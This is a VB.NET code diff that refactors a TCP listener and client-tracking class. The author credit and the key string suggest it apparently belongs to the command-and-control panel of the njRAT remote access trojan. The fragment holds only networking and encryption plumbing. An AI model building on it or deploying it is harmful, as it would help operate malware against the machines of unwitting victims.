@@ -1,11 +1,12 @@
-﻿Public Class Listner
+﻿Public Class S_Socket
     'credit njq8
     Public S As Net.Sockets.TcpListener
-    Public KEY As String = Convert.ToBase64String(SB("|'N'|"))
+    Public Shared KEY As String = Convert.ToBase64String(SB("|'N'|"))
     Public Event Data(ByVal u As USER, ByVal b As Byte())
     Public Event Disconnected(ByVal u As USER)
     Public Event Connected(ByVal u As USER)
     Public Event ms(ByVal u As USER, ByVal ms As Integer)
+    Public t As New Threading.Thread(AddressOf pnd)
 
     Sub New(ByVal port As Integer)
         S = New Net.Sockets.TcpListener(port)
@@ -14,7 +15,6 @@
         S.Server.SendTimeout = -1
         S.Server.SendBufferSize = 1024 * 1024
         S.Server.ReceiveBufferSize = 1024 * 1024
-        Dim t As New Threading.Thread(AddressOf pnd)
         t.Start()
     End Sub
     Sub pnd()
@@ -23,13 +23,13 @@
             Dim u As New USER(x, Me)
             SyncLock Online
                 Online.Add(u, u.IP)
-                u.C.BeginReceive(u.B, 0, u.B.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf RCV), u)
+                u.C.BeginReceive(u.B, 0, u.B.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf Read), u)
                 RaiseEvent Connected(u)
             End SyncLock
         End While
     End Sub
     Public Online As New Collection
-    Sub RCV(ByVal ar As IAsyncResult)
+    Sub Read(ByVal ar As IAsyncResult)
         Dim u As USER = ar.AsyncState
         If u.IsConnected = False Then GoTo disconnect
         Try
@@ -49,7 +49,7 @@ re:
             Else
                 GoTo disconnect
             End If
-            u.C.BeginReceive(u.B, 0, u.B.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf RCV), u)
+            u.C.BeginReceive(u.B, 0, u.B.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf Read), u)
             Exit Sub
         Catch ex As Exception
         End Try
@@ -62,7 +62,7 @@ disconnect:
         End SyncLock
     End Sub
     Public Function Send(ByVal u As USER, ByVal s As String) As Boolean
-        Return Send(u, SB(AES_Encrypt(s)))
+        Return Send(u, SB(S_Encryption.AES_Encrypt(s)))
     End Function
     Public Function Send(ByVal u As USER, ByVal b As Byte()) As Boolean
         Try
@@ -82,7 +82,7 @@ End Class
 
 Public Class USER
     Public WithEvents Timer As Timer
-    Public Listner As Listner
+    Public Listner As S_Socket
     Public IsConnected As Boolean = True
     Public L As ListViewItem = Nothing
     Public C As Net.Sockets.Socket
@@ -91,7 +91,7 @@ Public Class USER
     Public MEM As New IO.MemoryStream
     Public IsPinged As Boolean = False
     Public MS As Integer = 2500
-    Sub New(ByVal c As Net.Sockets.Socket, ByVal listner As Listner)
+    Sub New(ByVal c As Net.Sockets.Socket, ByVal listner As S_Socket)
         Me.C = c
         Me.Listner = listner
         IP = c.RemoteEndPoint.ToString
